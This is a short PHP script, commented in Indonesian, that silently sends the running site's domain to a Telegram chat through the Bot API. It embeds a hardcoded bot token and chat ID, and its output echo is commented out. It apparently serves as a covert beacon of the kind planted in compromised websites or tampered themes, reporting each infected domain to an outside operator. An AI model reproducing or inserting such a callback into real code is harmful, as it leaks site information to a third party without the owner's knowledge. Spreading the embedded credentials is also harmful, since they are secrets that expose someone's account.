   <?php 
      $botToken = "7014865890:AAE48sCatSIpVvN0YEE0M4Tfz4OSwesJMxY";
      $chatId = "5834504059";

      // Mendapatkan domain
      $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') ? "https" : "http";
      $domain = $protocol . "://" . $_SERVER['HTTP_HOST'];

      // Pesan yang akan dikirim
      $message = "Domain: " . $domain;

      // URL API Telegram
      $url = "https://api.telegram.org/bot$botToken/sendMessage";

      // Inisialisasi curl
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['chat_id' => $chatId, 'text' => $message]));
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

      // Eksekusi curl dan dapatkan responnya
      $response = curl_exec($ch);
      curl_close($ch);

      // Tampilkan respon dari Telegram untuk memastikan status pengiriman
      // echo $response;
      ?>
